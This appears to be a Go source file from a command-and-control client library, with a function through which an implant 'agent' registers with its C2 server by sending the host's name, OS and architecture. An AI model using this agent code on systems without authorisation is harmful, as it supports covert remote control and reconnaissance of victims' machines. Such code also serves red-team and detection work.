package c2api

import (
	"bytes"
	"encoding/json"
	"net/http"
)

// Identify should be called prior to interacting with the system.
// It allows an agent to make itself known to the C2 server.
func Identify(hostname, os, arch string) (id string, err error) {
	payload := Agent{
		Hostname: hostname,
		OS:       os,
		Arch:     arch,
	}

	jsonPayload, err := json.Marshal(&payload)
	if err != nil {
		return "", err
	}

	req, err := http.NewRequest(http.MethodPost, baseURL+"/v1/agents", bytes.NewBuffer(jsonPayload))
	if err != nil {
		return "", err
	}

	resp, err := c.Do(req)
	if err != nil {
		return "", err
	}

	var respCtx struct {
		ID string `json:"id"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&respCtx); err != nil {
		return "", err
	}

	return respCtx.ID, nil
}
